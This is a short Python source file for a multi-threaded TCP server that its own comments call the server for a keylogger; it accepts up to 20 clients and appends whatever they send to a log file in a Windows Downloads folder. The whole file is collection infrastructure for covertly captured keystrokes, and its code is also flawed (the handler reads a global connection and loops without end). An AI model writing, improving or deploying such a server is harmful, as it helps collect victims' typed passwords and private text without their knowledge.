import socket
import threading
#a tcp server for the keylogger
#multi-threaded 
#can supports upto 20 clients
#maybe buggy
def handler():
    i=12
    while i>0:
        data = c.recv(1024)
        data = data.decode('utf-8')
        print(data)
        fil = open("C:\\Users\\Student\\Downloads\\logs.txt", "a+")
        fil.write(data)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = ""
port = 5555
s.bind((host,port))
s.listen(20)
while True:
    c, addr = s.accept()
    if True:
        t1 = threading.Thread(target=handler)
        t1.daemon=True
        t1.start()
